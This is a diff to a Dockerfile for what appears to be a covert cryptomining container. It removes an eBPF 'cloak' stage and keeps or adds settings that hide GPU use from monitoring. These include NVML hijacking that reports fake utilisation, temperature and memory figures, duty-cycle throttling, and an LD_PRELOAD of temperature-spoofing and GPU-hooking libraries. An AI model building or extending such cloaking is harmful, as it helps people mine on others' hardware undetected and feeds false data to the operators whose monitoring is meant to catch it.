@@ -93,24 +93,6 @@ RUN set -eux; \
     command -v stunnel4 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends stunnel4); \
     ln -sf $(command -v stunnel4) /usr/bin/stunnel
 
-# ------------------  (6)  eBPF RUNTIME TỐI THIỂU (KHÔNG BUILD) -----------
-RUN set -eux; \
-    # Kích hoạt kho 'universe' một cách thủ công và đáng tin cậy
-    sed -i '/^#.*deb.*universe/s/^# //g' /etc/apt/sources.list && \
-    apt-get update && \
-    apt-get install -y --no-install-recommends \
-        # Core eBPF runtime (KHÔNG cần compilation tools)
-        libbpf0 libbpf-dev \
-        libelf1 libelf-dev \
-        # Python BCC bindings (pre-compiled từ Ubuntu repo)
-        python3-bpfcc bpfcc-tools \
-        # Tools để load eBPF
-        linux-tools-common linux-tools-generic \
-        # Kernel module support
-        kmod && \
-    # Hiển thị thông báo hoàn tất
-    echo "eBPF runtime setup completed" && \
-    rm -rf /var/lib/apt/lists/*
 
 # ------------------  (7)  Thư mục làm việc & Python deps -------------------
 RUN mkdir -p /app
@@ -127,10 +109,6 @@ RUN set -eux; \
     ln -sf $(which python3) /usr/bin/python || true; \
     pip3 install --no-cache-dir --break-system-packages --ignore-installed -r requirements.txt && \
     rm -rf /var/lib/apt/lists/* /root/.cache
-
-# ------------------  (8)  Copy eBPF objects & source code ----------------
-# GPU telemetry filter now in gpu_plugins module
-COPY mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o /app/mining_environment/gpu_plugins/ebpf/obj/
 
 # ------------------  (9)  Copy source code -------------------------------
 COPY . /app/
@@ -192,11 +170,6 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
     WORK_MS=1900 SLEEP_MS=100 \
     ENABLE_MPO=1 MPO_LIB=/opt/mpo/libmpo.so \
     ENABLE_NS_ISOLATION=1 NS_USE_NET=1 \
-    ENABLE_EBPF_CLOAK=0 EBPF_CONFIG_PATH=/app/mining_environment/gpu_plugins/ebpf/config/ebpf_config.json \
-    EBPF_LOG_LEVEL=INFO EBPF_DEBUG_MODE=false EBPF_MOCK_MODE=false \
-    EBPF_INSTALL_DIR=/sys/fs/bpf EBPF_LOG_DIR=/var/log/ebpf EBPF_TMP_DIR=/tmp/ebpf \
-    BPF_FS_PATH=/sys/fs/bpf \
-    ENABLE_EBPF_WRAPPER=0 EBPF_FALLBACK_MODE=disabled \
     PYTHONPATH=/app:/usr/local/lib/python3.10/dist-packages:/usr/lib/python3/dist-packages \
     GPU_PLUGINS_CONFIG=/app/mining_environment/gpu_plugins/config/gpu_plugins.yml \
     ENABLE_NVML_IPC_HIJACKING=1 NVML_FAKE_UTIL=5 NVML_FAKE_TEMP=48 NVML_FAKE_MEM_MB=256 NVML_ADD_NOISE=1 \
@@ -210,6 +183,7 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
 
 # FIX: Add CUDA library path for dynamic loading of CUDA plugins
 ENV LD_LIBRARY_PATH=/usr/local/cuda/lib64:/usr/local/cuda/lib64/stubs:$LD_LIBRARY_PATH
+
 ENV LD_PRELOAD="/opt/hooks/libtempspoof.so:/opt/hooks/libgpuhook.so"
 
 # ------------------  (14)  Verification và cleanup ------------------------
@@ -218,22 +192,8 @@ RUN set -eux; \
     command -v capsh >/dev/null 2>&1 || apt-get install -y --no-install-recommends libcap2-bin; \
     command -v capsh >/dev/null 2>&1 && ln -sf $(command -v capsh) /usr/local/bin/capsh; \
     ldconfig -p | grep -q "libuv.so.1" || (apt-get install -y --no-install-recommends libuv1 && ldconfig); \
-    # VERIFY eBPF objects exist (GPU telemetry filter in gpu_plugins module)
-    ls -la /app/mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o || echo "❌ gpu_telemetry_filter.bpf.o missing"; \
-    # Kiểm tra nội dung và kích thước của tệp đối tượng
-    file /app/mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o; \
-    du -h /app/mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o; \
-    # VERIFY Python eBPF libs are installed
-    python3 -c "import bcc; print('✅ BCC Python bindings OK')" || echo "❌ BCC import failed"; \
-    # VERIFY bpftool works
-    bpftool prog list >/dev/null 2>&1 && echo "✅ bpftool ready" || echo "⚠️ bpftool needs privileged mode"; \
     rm -rf /var/lib/apt/lists/*
 
-# Tạo thông tin kernel version
-RUN set -eux; \
-    mkdir -p /app/mining_environment/cpu_plugins/csrc/bpf/obj && \
-    echo "Kernel version: $(uname -r)" > /app/mining_environment/cpu_plugins/csrc/bpf/obj/kernel_version_info.txt && \
-    echo "Build date: $(date)" >> /app/mining_environment/cpu_plugins/csrc/bpf/obj/kernel_version_info.txt
 
 # ------------------  (15)  Setup scripts & GPU Debug Tool ----------------
 COPY setup_rdt.sh /app/setup_rdt.sh
